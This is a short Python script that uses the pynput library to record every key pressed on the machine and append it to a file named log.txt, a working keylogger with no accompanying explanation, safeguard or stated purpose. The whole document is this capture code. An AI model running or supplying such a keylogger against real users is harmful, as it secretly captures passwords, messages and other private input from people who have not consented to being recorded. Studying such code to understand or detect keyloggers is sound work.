from pynput.keyboard import Listener

def write_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    with open("log.txt", 'a') as log:
        log.write(letter)



with Listener(on_press=write_file) as listener:
    listener.join()